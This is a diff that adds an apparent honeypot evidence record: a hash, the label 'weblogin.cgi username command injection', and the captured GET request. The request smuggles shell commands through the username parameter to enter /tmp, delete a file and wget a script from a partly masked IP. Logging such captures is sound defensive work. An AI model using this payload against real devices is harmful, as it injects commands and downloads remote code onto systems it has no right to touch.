@@ -1,0 +1,5 @@
+SHA256: 3eafb36df6440e4bb08e0fde281cc5148133cfd4d669901a88b1c418a28b5ab6
+Pattern: weblogin.cgi username command injection
+Evidence source: T-Pot inbound payload
+
+GET /adv,/cgi-bin/weblogin.cgi?username=admin%27%3Bcd%20/tmp%3Brm%20-f%20.s%3Bwget%20http://91.92.40.XXX/wget.sh%20-O%20
